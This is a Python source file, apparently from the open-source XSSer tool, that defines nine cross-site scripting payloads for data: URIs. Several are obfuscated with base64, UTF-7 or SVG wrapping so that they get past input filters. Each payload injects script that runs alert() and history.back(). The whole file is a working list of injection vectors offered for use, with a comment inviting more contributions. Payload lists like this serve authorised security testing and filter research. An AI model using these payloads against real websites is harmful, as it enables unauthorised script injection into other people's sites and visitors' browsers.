"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2010 psy <root@lordepsylon.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

## XXSer.py @@ DCP vectors @@ psy
#
## This file contains different XSS vectors to inject in the Data Control Protocol (DCP).
## If you have some new vectors, please email me to [root@lordepsylon.net] and i will add your list to XSSer framework.
## After, all people who wants to update the tool only will need to do: (python XSser.py --update)
## Thats all.
###
## Happy Cross Hacking! ;)

DCPvectors = {
		'1' : """<a href="data:text/html;charset=utf-8,%3cscript%3ealert(1);history.back();%3c/script%3e">SCG09</a>""",
		'2' : '<iframe src="data:text/html;charset=utf-8,%3cscript%3ealert(1);history.back();%3c/script%3e"></iframe>',
		'3' : """data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTtoaXN0b3J5LmJhY2soKTs8L3NjcmlwdD4=""",
	        '4' : """data:text/html;charset=utf-7,+ADw-script+AD4-alert(1)+ADs-history.back()+ADsAPA-/script+AD4-""",
		'5' : """data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPg+-alert(1);history.back()+ADs-</script>""",
		'6' : """data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAOwBoAGkAcwB0AG8AcgB5AC4AYgBhAGMAawAoACkAOwA8AC8AcwBjAHIAaQBwAHQAPg==+-""",
		'7' : """data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWFsZXJ0KDEpK0FEcy1oaXN0b3J5LmJhY2soKStBRHNBUEEtL3NjcmlwdCtBRDQt""",
		'8' : """data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWFsZXJ0KDEpK0FEcy1oaXN0b3J5LmJhY2soKStBRHNBUEEtL3NjcmlwdCtBRDQt""",
		'9' : """data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==""",

		}


